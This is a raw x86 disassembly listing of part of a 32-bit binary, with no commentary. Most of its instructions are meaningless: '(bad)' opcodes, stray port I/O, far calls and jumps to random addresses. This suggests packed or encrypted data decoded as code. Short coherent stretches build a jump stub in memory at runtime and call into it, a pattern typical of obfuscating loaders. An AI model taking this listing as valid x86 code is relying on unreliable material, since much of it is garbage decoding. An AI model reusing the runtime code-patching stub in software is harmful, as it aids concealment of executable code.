  4100ad:	xchg   esi,eax
  4100ae:	push   ebp
  4100af:	fld    TBYTE PTR [edx-0x1c]
  4100b2:	push   0xffffffea
  4100b4:	(bad)  
  4100b5:	xor    BYTE PTR [ecx],dl
  4100b7:	mul    DWORD PTR [edi-0x4f14dee1]
  4100bd:	pop    edx
  4100be:	mov    al,0xfd
  4100c0:	or     dh,ch
  4100c2:	repz int 0xad
  4100c5:	cmc    
  4100c6:	or     dh,bh
  4100c8:	int    0xf4
  4100ca:	and    ebx,DWORD PTR [edi-0x51c7bcf2]
  4100d0:	je     0x4100ce
  4100d2:	out    dx,eax
  4100d3:	sub    eax,0xcef34e85
  4100d8:	mov    ebx,eax
  4100da:	es jnp 0x410063
  4100dd:	std    
  4100de:	sbb    DWORD PTR [edi-0x6548d08e],esi
  4100e4:	xor    cl,BYTE PTR [edx]
  4100e6:	cdq    
  4100e7:	shr    BYTE PTR [ebx+0x5c0a59da],cl
  4100ed:	dec    esi
  4100ee:	adc    al,0xa2
  4100f0:	retf   0xc782
  4100f3:	in     eax,0xd8
  4100f5:	mov    ?,WORD PTR gs:[eax]
  4100f8:	aad    0xbd
  4100fa:	daa    
  4100fb:	jge    0x410102
  4100fd:	test   esi,ecx
  4100ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410100:	jns    0x4100e0
  410102:	dec    esi
  410103:	mul    DWORD PTR [ecx-0x65575b29]
  410109:	dec    esp
  41010a:	adc    cl,BYTE PTR [ecx-0x1f]
  41010d:	push   ebp
  41010e:	xor    al,0xfb
  410110:	dec    DWORD PTR [ebp-0x28]
  410113:	push   ecx
  410114:	int3   
  410115:	sbb    edi,DWORD PTR [esi-0x60]
  410118:	dec    ebp
  410119:	add    BYTE PTR [esi-0x448ae42e],dh
  41011f:	in     al,dx
  410120:	mov    al,ds:0x9f29afea
  410125:	std    
  410126:	outs   dx,BYTE PTR ds:[esi]
  410127:	mov    ebp,0xf862b7ff
  41012c:	cs hlt 
  41012e:	mov    bl,0xcb
  410130:	leave  
  410131:	inc    esp
  410132:	mov    ebp,0xdb53ec8c
  410137:	ja     0x41019e
  410139:	sub    ebp,DWORD PTR [ebx-0x27f41a9c]
  41013f:	cld    
  410140:	and    DWORD PTR [eax+eiz*8+0x229166cd],esi
  410147:	inc    ecx
  410148:	sti    
  410149:	call   edx
  41014b:	loope  0x4101b3
  41014d:	popa   
  41014e:	out    dx,eax
  41014f:	jo     0x410114
  410151:	mov    eax,ds:0x8ed057ad
  410156:	lds    eax,FWORD PTR [ecx-0x702d417c]
  41015c:	mov    esp,0xcb288d4a
  410161:	add    BYTE PTR [edi],ah
  410163:	ds inc ebx
  410165:	in     eax,dx
  410166:	dec    ebx
  410167:	fnstenv [edi+ecx*8-0x7e]
  41016b:	mov    dl,0x80
  41016d:	loopne 0x41014f
  41016f:	xchg   ebx,eax
  410170:	aas    
  410171:	leave  
  410172:	push   edx
  410173:	mov    ds:0x88801150,al
  410178:	sbb    edx,0xfc8455b5
  41017e:	push   ebx
  41017f:	jb     0x41010b
  410181:	cmp    eax,0x97b132b8
  410186:	adc    eax,0x20e3b945
  41018b:	les    ebx,FWORD PTR [ebx]
  41018d:	push   es
  41018e:	mov    al,es:0xa17eb9c
  410194:	push   es
  410195:	jl     0x410180
  410197:	and    BYTE PTR [edi+0x734585ce],ah
  41019d:	fidiv  DWORD PTR [ecx+0x4c]
  4101a0:	data16 loopne 0x41018e
  4101a3:	aaa    
  4101a4:	gs jmp 0x1050c6f5
  4101aa:	add    eax,0x2ffd907d
  4101af:	push   ebx
  4101b0:	sub    DWORD PTR [eax+esi*4],edx
  4101b3:	add    eax,0xf38c6be7
  4101b8:	(bad)  
  4101b9:	in     al,dx
  4101ba:	cmp    edx,DWORD PTR [edi-0x5c8bbf48]
  4101c0:	adc    BYTE PTR [ebx],0xe8
  4101c3:	adc    cl,cl
  4101c5:	mov    ecx,0xc03c78e8
  4101ca:	enter  0xa07b,0x75
  4101ce:	clc    
  4101cf:	das    
  4101d0:	in     eax,0xa7
  4101d2:	loope  0x410225
  4101d4:	jb     0x4101eb
  4101d6:	outs   dx,DWORD PTR ds:[esi]
  4101d7:	dec    edi
  4101d8:	and    DWORD PTR [esi],ebx
  4101da:	imul   esp,edx
  4101dd:	cmc    
  4101de:	xor    al,dh
  4101e0:	sbb    al,0x9
  4101e2:	arpl   WORD PTR [edi],bx
  4101e4:	sub    al,0xaf
  4101e6:	pop    ss
  4101e7:	dec    ebp
  4101e8:	in     al,dx
  4101e9:	dec    ebp
  4101ea:	fadd   QWORD PTR [edx+0x2d]
  4101ed:	std    
  4101ee:	pop    ds
  4101ef:	enter  0xf07d,0x8f
  4101f3:	xor    DWORD PTR [esi-0x1b],esi
  4101f6:	stc    
  4101f7:	xor    eax,0xf012cbc4
  4101fc:	pop    ss
  4101fd:	cmp    DWORD PTR ds:0x9bac4008,ebp
  410203:	add    BYTE PTR [edi+ebp*4-0x2f680ef4],bl
  41020a:	lea    eax,[ebx]
  41020c:	dec    ebx
  41020d:	sar    BYTE PTR [edx+ecx*8],0x93
  410211:	inc    eax
  410212:	mov    WORD PTR [edi+0x29],cs
  410215:	imul   esi,DWORD PTR [ebp+0x13],0x3b89e287
  41021c:	daa    
  41021d:	je     0x41025c
  41021f:	stos   BYTE PTR es:[edi],al
  410220:	inc    ebp
  410221:	or     eax,0x850fc5e7
  410226:	xor    eax,0x8b000004
  41022b:	dec    ebp
  41022c:	mov    BYTE PTR [ebx],dh
  41022e:	sar    BYTE PTR [eax+0x209c],cl
  410234:	div    ecx
  410236:	mov    ecx,DWORD PTR ds:0x422558
  41023c:	mov    ecx,DWORD PTR [ecx+0x1a8]
  410242:	xor    edx,edx
  410244:	sub    ecx,eax
  410246:	mov    eax,DWORD PTR [ebp-0x4c]
  410249:	xor    eax,0x3daa
  41024e:	sub    eax,0x3375
  410253:	or     eax,0x6931
  410258:	lea    eax,[ebp+eax*1-0x6c25]
  41025f:	push   eax
  410260:	mov    eax,DWORD PTR [ebp-0x8c]
  410266:	push   0x18
  410268:	pop    esi
  410269:	div    esi
  41026b:	mov    esi,DWORD PTR [ebp-0x60]
  41026e:	xor    edx,edx
  410270:	div    esi
  410272:	mov    edx,DWORD PTR [ebp-0x44]
  410275:	mov    esi,DWORD PTR [ebp-0x34]
  410278:	xor    eax,edx
  41027a:	xor    edx,edx
  41027c:	div    esi
  41027e:	imul   eax,eax,0x7d2a
  410284:	sub    eax,0x928ded7
  410289:	push   eax
  41028a:	mov    eax,ds:0x422558
  41028f:	add    eax,0xaa
  410294:	push   eax
  410295:	mov    eax,DWORD PTR [ebp-0x3c]
  410298:	sub    ecx,eax
  41029a:	mov    eax,DWORD PTR [ebp-0x24]
  41029d:	push   DWORD PTR [ecx+eax*1+0xbd4]
  4102a4:	call   0x41e9f9
  4102a9:	mov    DWORD PTR [ebp-0x4],eax
  4102ac:	mov    ecx,DWORD PTR ds:0x422660
  4102b2:	lea    eax,[ebp+0x4]
  4102b5:	mov    DWORD PTR [ecx*4+0x422658],eax
  4102bc:	inc    DWORD PTR ds:0x422660
  4102c2:	mov    eax,DWORD PTR [ebp-0x4]
  4102c5:	mov    eax,DWORD PTR [ebp-0x4]
  4102c8:	xor    edx,edx
  4102ca:	shld   edx,eax,0x2
  4102ce:	shl    eax,0x2
  4102d1:	mov    ecx,0xca79a575
  4102d6:	mov    esi,0x9c1b89e8
  4102db:	xor    eax,ecx
  4102dd:	xor    edx,esi
  4102df:	cmp    eax,ecx
  4102e1:	jne    0x4105c9
  4102e7:	cmp    edx,esi
  4102e9:	jne    0x4105c9
  4102ef:	mov    eax,0xca79a571
  4102f4:	mov    edx,esi
  4102f6:	jmp    0x410669
  4102fb:	jmp    0x4105c9
  410300:	sbb    al,0xfc
  410302:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410303:	fs sbb bl,BYTE PTR es:[edx]
  410307:	mov    ebp,0x70cf8d86
  41030c:	mov    dl,0xf7
  41030e:	cmp    DWORD PTR [edx-0x3d],ebp
  410311:	xchg   edx,eax
  410312:	sbb    BYTE PTR [eax],bl
  410314:	mov    esi,0x57181814
  410319:	push   0xd5d12690
  41031e:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410320:	(bad)  
  410321:	enter  0x3876,0xa4
  410325:	jg     0x4102e2
  410327:	mov    bh,0x47
  410329:	or     al,0x50
  41032b:	adc    bl,BYTE PTR [ecx+0x1a476f47]
  410331:	mov    dl,0x44
  410333:	dec    edi
  410334:	jnp    0x4102dc
  410336:	bound  ebx,QWORD PTR [esi]
  410338:	sahf   
  410339:	loop   0x41039f
  41033b:	push   esp
  41033c:	(bad)
  41033f:	and    al,BYTE PTR [eax]
  410341:	cmp    eax,0x6a11edeb
  410346:	lock xor ch,0xd0
  41034a:	cmc    
  41034b:	loopne 0x4102ea
  41034d:	lds    ecx,FWORD PTR [ebx+0x3e]
  410350:	jp     0x4103a9
  410352:	fdiv   QWORD PTR [esi+0xc]
  410355:	ds push esp
  410357:	lds    ebx,FWORD PTR [ebp+0x48]
  41035a:	js     0x410333
  41035c:	jl     0x410365
  41035e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41035f:	mov    eax,ds:0x4685d9e3
  410364:	hlt    
  410365:	test   BYTE PTR [esi+ebx*2],0x31
  410369:	jmp    0x410330
  41036b:	cwde   
  41036c:	and    al,0x67
  41036e:	call   0xfb01:0x6a66a427
  410375:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410376:	(bad)  
  410377:	mov    esi,0x27ed0321
  41037c:	adc    BYTE PTR [esi+0x2a0610a9],0x14
  410383:	lods   eax,DWORD PTR ds:[esi]
  410384:	mov    bl,0x9d
  410386:	int3   
  410387:	sub    al,0x4
  410389:	inc    ecx
  41038a:	dec    esp
  41038b:	inc    esi
  41038c:	dec    esi
  41038d:	iret   
  41038e:	fidiv  WORD PTR [edi-0x6d3fe8c4]
  410394:	push   DWORD PTR ds:0x4c07af07
  41039a:	stos   BYTE PTR es:[edi],al
  41039b:	sbb    BYTE PTR [ecx],dl
  41039d:	mov    dh,0x71
  41039f:	or     al,0x5c
  4103a1:	fs xchg esp,eax
  4103a3:	sbb    edx,DWORD PTR [edx+esi*2]
  4103a6:	fs push ebp
  4103a8:	or     eax,0xbc7e4868
  4103ad:	cmp    ebp,DWORD PTR [ebp-0x1ea1ee8b]
  4103b3:	push   0x18
  4103b5:	sbb    DWORD PTR [ecx],ebx
  4103b7:	inc    ecx
  4103b8:	push   0x4a
  4103ba:	xor    bh,bl
  4103bc:	stos   DWORD PTR es:[edi],eax
  4103bd:	xor    ebx,DWORD PTR [edx+0x62a86df9]
  4103c3:	repnz out 0xa7,eax
  4103c6:	stos   DWORD PTR es:[edi],eax
  4103c7:	daa    
  4103c8:	leave  
  4103c9:	push   ss
  4103ca:	aas    
  4103cb:	scas   al,BYTE PTR es:[edi]
  4103cc:	call   0xc5c4:0x7e238632
  4103d3:	(bad)  [edx-0x6b3c2949]
  4103d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4103da:	xchg   ecx,eax
  4103db:	xchg   BYTE PTR [ecx+0x49],ah
  4103de:	mov    ecx,0x6fab15e9
  4103e3:	dec    ebx
  4103e4:	sub    BYTE PTR [esi],bl
  4103e6:	repnz sbb eax,0x4319453a
  4103ec:	loope  0x410409
  4103ee:	add    bh,cl
  4103f0:	pop    ecx
  4103f1:	or     al,0xe4
  4103f3:	fbld   TBYTE PTR [eax+0x5cbed657]
  4103f9:	sub    esp,ebp
  4103fb:	mov    ds:0xfca573e8,eax
  410400:	jnp    0x410459
  410402:	xlat   BYTE PTR ds:[ebx]
  410403:	inc    eax
  410404:	mov    ch,0x3e
  410406:	xor    eax,0x552d35a8
  41040b:	int3   
  41040c:	mov    edx,0xa4afe466
  410411:	stos   DWORD PTR es:[edi],eax
  410412:	fs pop ss
  410414:	add    eax,0xd88c588
  410419:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41041a:	ficomp DWORD PTR [ecx-0x63ca320d]
  410420:	add    ecx,ebx
  410422:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410423:	fdiv   DWORD PTR [edi-0x6442573e]
  410429:	ja     0x410427
  41042b:	jle    0x41041a
  41042d:	in     al,0x94
  41042f:	mov    esi,0x9dbba7df
  410434:	cs int 0xaf
  410437:	aas    
  410438:	es pop ebp
  41043a:	pop    edi
  41043b:	pop    ds
  41043c:	(bad)  
  41043d:	sahf   
  41043e:	cld    
  41043f:	jo     0x410472
  410441:	jle    0x4104b3
  410443:	push   ds
  410444:	fld    DWORD PTR [edi+0x68]
  410447:	stos   DWORD PTR es:[edi],eax
  410448:	test   BYTE PTR [ecx+0x6ac57fe8],ah
  41044e:	mov    esp,0x78d75526
  410453:	jecxz  0x4104b8
  410455:	lea    edi,[esp+edi*2+0x70d65d52]
  41045c:	add    esi,DWORD PTR [edi+0x3dc40183]
  410462:	adc    DWORD PTR [esi+0x422e542f],esi
  410468:	or     al,0xd9
  41046a:	mov    WORD PTR [edx-0x4bf4da06],?
  410470:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410471:	cmp    eax,0x6c9447ac
  410476:	xchg   esp,eax
  410477:	mov    dh,cl
  410479:	cwde   
  41047a:	retf   
  41047b:	sbb    ebp,DWORD PTR [esi+0xb643e24]
  410481:	sub    dl,BYTE PTR gs:[ebx+0x4b]
  410485:	mov    bl,0x87
  410487:	bound  edx,QWORD PTR [esi-0x3f]
  41048a:	(bad)
  41048e:	ror    DWORD PTR [ebx],1
  410490:	pop    ds
  410491:	fcom   QWORD PTR [ebx]
  410493:	push   ds
  410494:	fistp  WORD PTR [edi-0x4a6f23f1]
  41049a:	sub    bl,dh
  41049c:	test   eax,0xb6c4e1c4
  4104a1:	adc    eax,0x67d39c4d
  4104a6:	stos   BYTE PTR es:[edi],al
  4104a7:	inc    ebp
  4104a8:	mul    DWORD PTR [eax-0x10]
  4104ab:	jge    0x41052b
  4104ad:	aad    0x61
  4104af:	push   edx
  4104b0:	fisttp QWORD PTR [edi+0x22]
  4104b3:	stos   BYTE PTR es:[edi],al
  4104b4:	and    al,0xfe
  4104b6:	ds sub al,0x0
  4104b9:	cmp    al,BYTE PTR [ebx+eiz*4]
  4104bc:	inc    eax
  4104bd:	inc    ebp
  4104be:	add    ah,bh
  4104c0:	push   ds
  4104c1:	stc    
  4104c2:	mov    ds:0xc30d351a,al
  4104c7:	pop    esi
  4104c8:	imul   ebp,esi,0x25d6562c
  4104ce:	sub    esi,DWORD PTR [edi-0x52]
  4104d1:	xor    BYTE PTR fs:0xeb048548,0xd9
  4104d9:	shl    DWORD PTR [eax+0x4e8bb0c4],0xed
  4104e0:	daa    
  4104e1:	mov    ebp,0xa39dc81a
  4104e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4104e7:	pop    esp
  4104e8:	or     DWORD PTR [ebx-0x6691b8ed],edi
  4104ee:	jg     0x4104d2
  4104f0:	in     al,dx
  4104f1:	push   ebx
  4104f2:	scas   al,BYTE PTR es:[edi]
  4104f3:	cmp    ch,BYTE PTR [edi-0x22]
  4104f6:	cmp    ecx,esp
  4104f8:	ffree  st(4)
  4104fa:	mov    al,ds:0x7ec6a307
  4104ff:	push   cs
  410500:	jge    0x410557
  410502:	jle    0x41051c
  410504:	fld    TBYTE PTR [ebx-0x5fa02f76]
  41050a:	aad    0x19
  41050c:	test   al,0x81
  41050e:	and    esi,DWORD PTR [edx]
  410510:	cmp    BYTE PTR ds:0x4c2274a,ah
  410516:	loope  0x4104f6
  410518:	xchg   ecx,eax
  410519:	xchg   esp,eax
  41051a:	and    eax,0xfd8a3315
  41051f:	loope  0x4104e8
  410521:	(bad)  
  410523:	and    BYTE PTR [ecx-0x2a],dl
  410526:	fdiv   QWORD PTR [ebx-0x2416d14]
  41052c:	adc    dh,BYTE PTR [esi-0x55]
  41052f:	jns    0x41056d
  410531:	jbe    0x410512
  410533:	mov    ebx,0x704ba7f8
  410538:	loop   0x41057f
  41053a:	push   0x66
  41053c:	mov    eax,0x8c273471
  410541:	sti    
  410542:	and    BYTE PTR [ebx],0x75
  410545:	mov    eax,ds:0xc71b3cc0
  41054a:	not    BYTE PTR [ebp+0x54a736d6]
  410550:	jne    0x4104e9
  410552:	xchg   edx,eax
  410553:	es xor eax,0x4a34342f
  410559:	jne    0x4105a5
  41055b:	mov    ecx,0x785d038a
  410560:	inc    edi
  410561:	xchg   esp,eax
  410562:	inc    esp
  410563:	jp     0x41058f
  410565:	fwait
  410566:	inc    ebx
  410567:	mov    gs,eax
  410569:	pop    esi
  41056a:	add    BYTE PTR [edi+0x65],dl
  41056d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41056e:	pop    DWORD PTR [ebp-0xb4cc33d]
  410574:	xchg   esp,eax
  410575:	push   esp
  410576:	fst    DWORD PTR [esi-0x100f5010]
  41057c:	fs stos BYTE PTR es:[edi],al
  41057e:	int    0x8f
  410580:	sbb    bh,BYTE PTR [eax+0x47]
  410583:	test   DWORD PTR [ecx+0x2a],ecx
  410586:	in     al,dx
  410587:	pop    es
  410588:	sbb    BYTE PTR [ebx+0x35a11a22],bh
  41058e:	jb     0x41054c
  410590:	(bad)
  410594:	push   es
  410595:	in     eax,dx
  410596:	add    eax,0x11f396d3
  41059b:	inc    edi
  41059c:	xor    BYTE PTR [eax+0x21f94092],dh
  4105a2:	(bad)  
  4105a3:	cmc    
  4105a4:	xchg   DWORD PTR [ebx-0x2a],edi
  4105a7:	xor    esp,esi
  4105a9:	cdq    
  4105aa:	or     ebx,esi
  4105ac:	push   ss
  4105ad:	outs   dx,BYTE PTR ds:[esi]
  4105ae:	fimul  DWORD PTR ds:0x768cf2c5
  4105b4:	push   es
  4105b5:	iret   
  4105b6:	int3   
  4105b7:	cld    
  4105b8:	or     DWORD PTR [esi+ecx*2],ebx
  4105bb:	sub    eax,0x8aba377e
  4105c0:	mov    ebx,0xe9dd1c90
  4105c5:	adc    eax,0x8d4ddb92
  4105ca:	inc    ebp
  4105cb:	lock mov DWORD PTR [ebp-0x9c],eax
  4105d2:	mov    eax,DWORD PTR [ebp-0x54]
  4105d5:	mov    DWORD PTR [ebp-0x10],eax
  4105d8:	mov    eax,DWORD PTR [ebp-0x10]
  4105db:	mov    ecx,DWORD PTR [ebp-0x4]
  4105de:	sub    eax,ecx
  4105e0:	mov    DWORD PTR [ebp-0x10],eax
  4105e3:	mov    eax,DWORD PTR [ebp-0x20]
  4105e6:	mov    ecx,DWORD PTR [ebp-0x1c]
  4105e9:	sub    DWORD PTR [ebp-0x10],eax
  4105ec:	mov    eax,DWORD PTR [ebp-0x4]
  4105ef:	mov    DWORD PTR [eax],0x658776e9
  4105f5:	mov    DWORD PTR [eax+0x4],0xab756547
  4105fc:	mov    eax,DWORD PTR [ebp-0x10]
  4105ff:	mov    ecx,DWORD PTR [ebp-0x4]
  410602:	mov    DWORD PTR [ecx+0x1],eax
  410605:	mov    eax,ds:0x4223d4
  41060a:	push   DWORD PTR [eax]
  41060c:	push   DWORD PTR ds:0x422648
  410612:	push   DWORD PTR ds:0x4223dc
  410618:	push   DWORD PTR ds:0x422628
  41061e:	push   DWORD PTR ds:0x42269c
  410624:	push   0xa4069aaa
  410629:	push   0xa4069aae
  41062e:	push   DWORD PTR [ebp-0x5c]
  410631:	mov    eax,DWORD PTR [ebp-0x4]
  410634:	call   eax
  410636:	mov    eax,DWORD PTR [edi]
  410638:	mov    eax,DWORD PTR [ebp+0x8]
  41063b:	push   DWORD PTR [eax]
  41063d:	call   0x4110ff
  410642:	mov    eax,ds:0x422558
  410647:	push   0x4
  410649:	add    eax,0x1dc
  41064e:	push   eax
  41064f:	push   edi
  410650:	call   0x415231
  410655:	mov    eax,0xca79a57d
  41065a:	jmp    0x4102f4
  41065f:	mov    eax,0xca79a575
  410664:	mov    edx,0x9c1b89e8
  410669:	pop    esi
  41066a:	pop    ebx
  41066b:	leave  
  41066c:	ret    0x4
  41066f:	push   ebp
  410670:	mov    ebp,esp
  410672:	sub    esp,0x20
  410675:	push   ebx
  410676:	push   edi
  410677:	mov    DWORD PTR [ebp-0x8],0x522e
  41067e:	mov    DWORD PTR [ebp-0x4],0x3dbd
  410685:	mov    DWORD PTR [ebp-0x10],0x53f1
  41068c:	mov    DWORD PTR [ebp-0xc],0x631b
  410693:	mov    DWORD PTR [ebp-0x18],0x524d
  41069a:	mov    DWORD PTR [ebp-0x14],0x1600
  4106a1:	mov    eax,DWORD PTR [ebp-0x18]
  4106a4:	mov    ecx,DWORD PTR [ebp-0x14]
  4106a7:	mov    edx,DWORD PTR [ebp-0x10]
  4106aa:	mov    edi,DWORD PTR [ebp-0xc]
  4106ad:	push   edi
  4106ae:	push   edx
  4106af:	push   ecx
  4106b0:	push   eax
  4106b1:	call   0x416c20
  4106b6:	mov    ecx,DWORD PTR [ebp-0x8]
  4106b9:	mov    edi,DWORD PTR [ebp-0x4]
  4106bc:	add    eax,0x1dc8
  4106c1:	adc    edx,0x6fbf
  4106c7:	and    edx,edi
  4106c9:	push   0x1061
  4106ce:	and    eax,ecx
  4106d0:	or     edx,0x23ff
  4106d6:	push   0x4000022f
  4106db:	jmp    0x4109bb
  4106e0:	pop    edi
  4106e1:	jp     0x410689
  4106e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4106e4:	mov    ds:0x103a5b1c,al
  4106e9:	fsub   QWORD PTR [edi-0x44]
  4106ec:	jno    0x41069e
  4106ee:	dec    ecx
  4106ef:	push   0x68
  4106f1:	mov    ds,WORD PTR [eax]
  4106f3:	sbb    BYTE PTR [edx+0x1e181814],bl
  4106f9:	jnp    0x4106cb
  4106fb:	es mov edi,0xa3f862fb
  410701:	fldenv [ebx+0x57]
  410704:	iret   
  410705:	pusha  
  410706:	je     0x410700
  410708:	sbb    bl,BYTE PTR [ebx]
  41070a:	mov    ch,0x91
  41070c:	in     al,dx
  41070d:	sbb    eax,0x2592f8f4
  410712:	mov    ah,0x69
  410715:	sbb    ebp,0xf03332fb
  41071b:	ins    BYTE PTR es:[edi],dx
  41071c:	or     al,0xe5
  41071e:	hlt    
  41071f:	cmc    
  410720:	loopne 0x41076d
  410722:	lods   al,BYTE PTR ds:[esi]
  410723:	sbb    al,0x32
  410725:	cmp    ebx,DWORD PTR ds:0x81060a19
  41072b:	xchg   dl,cl
  41072d:	lea    esp,[edx+0x4258c26e]
  410733:	pop    ecx
  410734:	nop
  410735:	adc    DWORD PTR [ebp+ecx*1-0x710d0cff],esi
  41073c:	mov    edi,0xdcaebe17
  410741:	rcl    DWORD PTR [esi-0x3dc9482f],0xf2
  410748:	jmp    0x54eb:0xec92327a
  41074f:	xchg   DWORD PTR [esp+edx*2+0x64453cbe],esp
  410756:	retf   
  410757:	sbb    DWORD PTR [edx],ebx
  410759:	loop   0x4107af
  41075b:	mov    al,0x4b
  41075d:	xchg   esp,eax
  41075e:	out    0x75,al
  410760:	in     al,dx
  410761:	sub    BYTE PTR [edx-0x21],ch
  410764:	lds    esi,FWORD PTR [esi-0x38d18fc0]
  41076a:	sar    ah,0x4d
  41076d:	in     al,dx
  41076e:	jp     0x4107d4
  410770:	push   ds
  410771:	jmp    0x41077e
  410773:	add    dl,dh
  410775:	test   DWORD PTR [eax+0x10d7b2d1],esp
  41077b:	dec    edi
  41077c:	jb     0x410745
  41077e:	clc    
  41077f:	and    dl,BYTE PTR [eax]
  410781:	add    esp,esi
  410783:	retf   
  410784:	inc    edx
  410785:	jae    0x410768
  410787:	loop   0x4107e9
  410789:	xor    DWORD PTR [ebx],ecx
  41078b:	add    ecx,DWORD PTR [esi+0x452b4508]
  410791:	mov    al,0x50
  410793:	ss in  eax,dx
  410795:	xor    BYTE PTR [edi],ah
  410797:	call   0x9d7b:0x5ecfa05e
  41079e:	in     eax,0xd0
  4107a0:	ret    0xe463
  4107a3:	pop    ebx
  4107a4:	pop    ebp
  4107a5:	pop    edi
  4107a6:	retf   0xd524
  4107a9:	mov    esi,0x847c6e02
  4107ae:	ins    BYTE PTR es:[edi],dx
  4107af:	and    DWORD PTR [esi+0x3e],esi
  4107b2:	cmp    esi,DWORD PTR [esp+ebp*8+0x4ae616c0]
  4107b9:	and    DWORD PTR [eax],esi
  4107bb:	mov    edi,0xe27b2fd8
  4107c0:	jl     0x410744
  4107c2:	into   
  4107c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4107c4:	push   0xb9b0ae4
  4107c9:	leave  
  4107ca:	jbe    0x41078c
  4107cc:	arpl   bx,bx
  4107ce:	scas   eax,DWORD PTR es:[edi]
  4107cf:	add    eax,0x9f8fee80
  4107d4:	or     al,dl
  4107d6:	daa    
  4107d7:	jbe    0x410813
  4107d9:	push   ss
  4107da:	jno    0x410810
  4107dc:	adc    al,0x11
  4107de:	loope  0x410766
  4107e0:	imul   ebp,esi,0x53
  4107e3:	dec    dx
  4107e5:	pushf  
  4107e6:	ds hlt 
  4107e8:	inc    ebp
  4107e9:	repz mov eax,ds:0xa18e0c0a
  4107ef:	imul   eax,DWORD PTR [eax],0xb9c7927a
  4107f5:	enter  0x115b,0xba
  4107f9:	int3   
  4107fa:	push   0xa5f2f085
  4107ff:	xor    esi,DWORD PTR [ecx+0x1f]
  410802:	add    BYTE PTR [ecx+0x7e],0xd3
  410806:	sbb    BYTE PTR [eax],ah
  410808:	jl     0x41081f
  41080a:	fnstcw WORD PTR [ebx]
  41080c:	div    BYTE PTR [ebx+0x3]
  41080f:	or     bh,bh
  410811:	lock iret 
  410813:	aaa    
  410814:	xchg   esp,eax
  410815:	(bad)  
  410816:	mov    dh,BYTE PTR [ebp+0x2]
  410819:	xor    DWORD PTR [esi-0x14],edi
  41081c:	inc    eax
  41081d:	mov    ecx,0x5c8b052e
  410822:	sub    eax,0xc80e5751
  410827:	pop    ecx
  410828:	mov    bh,0xdb
  41082a:	push   ecx
  41082b:	ficom  WORD PTR [ebp+edx*4+0x7f]
  41082f:	mov    WORD PTR cs:[ecx+0x19],fs
  410833:	out    0x19,al
  410835:	mov    al,0x23
  410837:	(bad)  
  410838:	mov    esp,0x257760a
  41083d:	xor    esi,DWORD PTR [ebx+0x14394249]
  410843:	or     dl,al
  410845:	and    DWORD PTR [ebp-0x106e3f56],esi
  41084b:	push   ds
  41084c:	gs fs std 
  41084f:	dec    ecx
  410850:	dec    ax
  410852:	mov    dh,0x38
  410854:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410855:	mov    eax,0x1eefb82b
  41085a:	mov    ebx,0xdd07f33c
  41085f:	js     0x4107ec
  410861:	mov    bh,0xc6
  410863:	lods   al,BYTE PTR ds:[esi]
  410864:	jmp    0x2ddfc79e
  410869:	pop    eax
  41086a:	sub    dl,BYTE PTR [ebp+0x2bbdedde]
  410870:	loopne 0x4108b0
  410872:	push   eax
  410873:	add    ah,al
  410875:	popa   
  410876:	das    
  410877:	cdq    
  410878:	add    al,0x61
  41087a:	mov    ds:0xddcee001,al
  41087f:	fcmovb st,st(6)
  410881:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410882:	pop    edi
  410883:	and    al,0xae
  410885:	in     eax,dx
  410886:	aam    0x74
  410888:	fmul   st,st(4)
  41088a:	imul   ebx,DWORD PTR [ecx+eiz*4],0xf
  41088e:	xor    al,0xae
  410890:	stos   DWORD PTR es:[edi],eax
  410891:	syscall 
  410893:	aam    0xdd
  410895:	pusha  
  410896:	mov    bl,0xe7
  410898:	pop    ss
  410899:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41089a:	out    0xbd,eax
  41089c:	retf   
  41089d:	fsub   st(5),st
  41089f:	dec    ebp
  4108a0:	jge    0x410921
  4108a2:	push   ss
  4108a3:	jmp    0xfa2d:0x66076467
  4108aa:	sar    DWORD PTR [esi],cl
  4108ac:	lds    esp,FWORD PTR [ecx]
  4108ae:	mov    dh,0x89
  4108b0:	in     al,0x82
  4108b2:	mov    cl,0x90
  4108b4:	retf   0x8594
  4108b7:	xor    al,0x3
  4108b9:	push   es
  4108ba:	int    0x9d
  4108bc:	aam    0x78
  4108be:	xchg   edx,eax
  4108bf:	retf   0x861f
  4108c2:	pop    edx
  4108c3:	jge    0x410898
  4108c5:	call   0x307:0xd08cc448
  4108cc:	jg     0x410850
  4108ce:	jno    0x4108d8
  4108d0:	cmp    esp,DWORD PTR [edi-0x23]
  4108d3:	and    bh,BYTE PTR [ecx-0x38]
  4108d6:	dec    ebx
  4108d7:	loopne 0x41094e
  4108d9:	mov    bl,0xc8
  4108db:	cmp    BYTE PTR [edx+0x26b2e98],ch
  4108e1:	enter  0x6c6e,0xcf
  4108e5:	mov    ebp,0x5d24bfdf
  4108ea:	imul   esi,DWORD PTR [ecx+0x13c1b25e],0x5bce11de
  4108f4:	les    ecx,FWORD PTR [ebx+ebx*2-0x7c]
  4108f8:	or     ebp,ebp
  4108fa:	xchg   ecx,eax
  4108fb:	shr    DWORD PTR [ebp-0x14],0x48
  4108ff:	push   eax
  410900:	sar    DWORD PTR ds:[eax+eiz*4],cl
  410904:	or     BYTE PTR [edi-0x7a],al
  410907:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410908:	(bad)  [ebp+eiz*4-0x2aa2966f]
  41090f:	pop    esp
  410911:	mov    ds:0x9e47c60f,eax
  410916:	call   0xc8eeafab
  41091b:	mov    fs,WORD PTR [eax+0x49]
  41091e:	scas   eax,DWORD PTR es:[edi]
  41091f:	mov    bh,0x3d
  410921:	sahf   
  410922:	xor    dh,ch
  410924:	jae    0x41098e
  410926:	mov    eax,ds:0x45e733fb
